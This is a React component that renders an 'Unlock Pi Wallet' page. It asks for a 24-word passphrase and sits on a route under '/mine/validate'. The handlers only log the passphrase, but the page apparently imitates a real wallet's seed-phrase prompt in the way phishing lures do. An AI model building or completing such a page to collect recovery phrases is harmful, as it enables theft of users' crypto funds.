import { useState } from 'react';
import { useNavigate } from 'react-router';

export default function WalletPage() {
  const navigate = useNavigate();
  const [passphrase, setPassphrase] = useState('');

  const handleBack = () => {
    navigate('/mine/validate');
  };

  const handleUnlockWithPassphrase = () => {
    // Handle passphrase unlock logic here
    console.log('Unlocking with passphrase:', passphrase);
  };

  const handleUnlockWithFingerprint = () => {
    // Handle fingerprint unlock logic here
    console.log('Unlocking with fingerprint');
  };

  return (
    <div>
      <style>{`
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
        }

        body {
          font-family: 'Roboto', sans-serif;
          background: #fff;
          color: #444;
        }

        .wallet-container {
          min-height: 100vh;
          background: #fff;
        }

        .wallet-header {
          background: #783A8D;
          color: white;
          padding: 12px 20px;
          display: flex;
          align-items: center;
          position: relative;
          height: 60px;
        }

        .back-arrow {
          font-size: 24px;
          cursor: pointer;
          color: white;
          position: absolute;
          left: 20px;
        }

        .header-content {
          display: flex;
          align-items: center;
          position: absolute;
          left: 50%;
          transform: translateX(-50%);
        }

        .wallet-icon {
          width: 32px;
          height: 32px;
          margin-right: 8px;
        }

        .header-title {
          font-size: 18px;
          font-weight: 500;
        }

        .dropdown-icon {
          position: absolute;
          right: 20px;
          font-size: 18px;
          color: white;
        }

        .wallet-content {
          padding: 30px 20px;
          text-align: center;
        }

        .unlock-title {
          font-size: 24px;
          font-weight: bold;
          color: #333;
          margin-bottom: 30px;
        }

        .passphrase-container {
          margin-bottom: 30px;
        }

        .passphrase-input {
          width: 100%;
          min-height: 120px;
          padding: 15px;
          border: 2px solid #ddd;
          border-radius: 8px;
          font-size: 16px;
          font-family: 'Roboto', sans-serif;
          resize: vertical;
          background: #f9f9f9;
          color: #333;
        }

        .passphrase-input:focus {
          outline: none;
          border-color: #783A8D;
          background: #fff;
        }

        .passphrase-input::placeholder {
          color: #999;
          font-style: italic;
        }

        .button-container {
          display: flex;
          flex-direction: column;
          gap: 15px;
          margin-bottom: 30px;
        }

        .unlock-button {
          width: 100%;
          padding: 15px;
          font-size: 16px;
          font-weight: bold;
          border: none;
          border-radius: 8px;
          cursor: pointer;
          transition: all 0.3s ease;
        }

        .passphrase-btn {
          background: #783A8D;
          color: white;
        }

        .passphrase-btn:hover {
          background: #6a3278;
        }

        .fingerprint-btn {
          background: #f0f0f0;
          color: #333;
          border: 2px solid #ddd;
        }

        .fingerprint-btn:hover {
          background: #e8e8e8;
          border-color: #ccc;
        }

        .warning-section {
          text-align: left;
          background: #fff8f0;
          border: 1px solid #ffd700;
          border-radius: 8px;
          padding: 20px;
          margin-bottom: 20px;
        }

        .warning-text {
          font-size: 14px;
          line-height: 1.6;
          color: #333;
          margin-bottom: 15px;
        }

        .recovery-text {
          font-size: 14px;
          line-height: 1.6;
          color: #333;
        }

        .recovery-text strong {
          color: #d63031;
        }

        @media (max-width: 480px) {
          .wallet-content {
            padding: 20px 15px;
          }

          .unlock-title {
            font-size: 20px;
          }

          .passphrase-input {
            min-height: 100px;
          }
        }
      `}</style>

      <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />

      <div className="wallet-container">
        <header className="wallet-header">
          <div className="back-arrow" onClick={handleBack}>
            ←
          </div>
          <div className="header-content">
            <img src="images/wallet.jpg" alt="Wallet Icon" className="wallet-icon" />
            <span className="header-title">Wallet</span>
          </div>
          <div className="dropdown-icon">▼</div>
        </header>

        <div className="wallet-content">
          <h1 className="unlock-title">Unlock Pi Wallet</h1>
          
          <div className="passphrase-container">
            <textarea
              className="passphrase-input"
              placeholder="Enter your 24-word passphrase here"
              value={passphrase}
              onChange={(e) => setPassphrase(e.target.value)}
              rows={5}
            />
          </div>

          <div className="button-container">
            <button 
              className="unlock-button passphrase-btn"
              onClick={handleUnlockWithPassphrase}
            >
              UNLOCK WITH PASSPHRASE
            </button>
            <button 
              className="unlock-button fingerprint-btn"
              onClick={handleUnlockWithFingerprint}
            >
              UNLOCK WITH FINGERPRINT
            </button>
          </div>

          <div className="warning-section">
            <p className="warning-text">
              As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
            </p>
            
            <p className="recovery-text">
              <strong>Lost your passphrase?</strong> You can create a new wallet, but all your π in your previous wallet will be inaccessible.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
